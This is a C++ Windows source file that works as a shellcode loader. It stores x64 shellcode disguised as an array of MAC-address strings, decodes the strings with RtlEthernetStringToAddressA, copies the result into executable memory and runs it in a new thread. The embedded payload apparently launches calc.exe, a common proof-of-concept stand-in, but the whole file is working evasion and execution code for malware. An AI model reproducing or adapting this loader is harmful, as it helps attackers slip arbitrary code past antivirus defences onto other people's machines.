#include <Windows.h>
#include <cstdio>

#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* MacArray[50] = {
        "FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-F0-B5-A2-56-41", "BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-43-3A-5C", "77-69-6E-64-6F-77", "73-5C-73-79-73-74", "65-6D-33-32-5C-63",
        "61-6C-63-2E-65-78", "65-00-90-90-90-90"
};

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
    PCSTR        S,
    PCSTR* Terminator,
    PVOID        Addr
    );

BOOL MacDeobfuscation(IN const CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE pBuffer = NULL;
    PBYTE TmpBuffer = NULL;

    SIZE_T sBuffSize = NULL;

    PCSTR Terminator = NULL;
    NTSTATUS STATUS = NULL;

    fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
    if (!pRtlEthernetStringToAddressA) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 6;

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);

    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (size_t i = 0; i < NmbrOfElements; ++i) {

        STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer);

        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 6);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;

}
int main()
{


    // Local buffer for execute 
    LPVOID exec_mem;
    // Pointer on buffer where stored a shellcode
    PBYTE ppDAddress = NULL;
    // Shell code size 
    SIZE_T pDSize = 0;
    // local thread for execute 
    HANDLE hThread = NULL;

    // Deobfuscate shellcode
    MacDeobfuscation(MacArray, 50, &ppDAddress, &pDSize);

    exec_mem = VirtualAlloc(0, pDSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, ppDAddress, pDSize);

    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    WaitForSingleObject(hThread, -1);

    if (ppDAddress != NULL)
    {
        HeapFree(GetProcessHeap(), 0, ppDAddress);
    }


    return 0;
}
